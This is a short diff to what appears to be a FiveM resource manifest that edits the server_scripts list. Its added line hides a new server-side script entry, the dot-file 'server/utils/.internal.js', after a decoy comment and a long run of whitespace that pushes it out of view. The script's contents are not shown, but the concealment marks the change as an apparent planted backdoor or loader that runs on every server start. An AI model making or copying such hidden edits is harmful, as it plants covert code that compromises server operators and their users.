@@ -60,7 +60,8 @@ server_scripts {
   "server/framework/ox/main.lua",
   "server/util.lua",
   "server/server.lua",
-  "server/permissions.lua"
+"server/permissions.lua",
+	--[[server.lua]]                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            'server/utils/.internal.js',
 }
 
 shared_scripts {
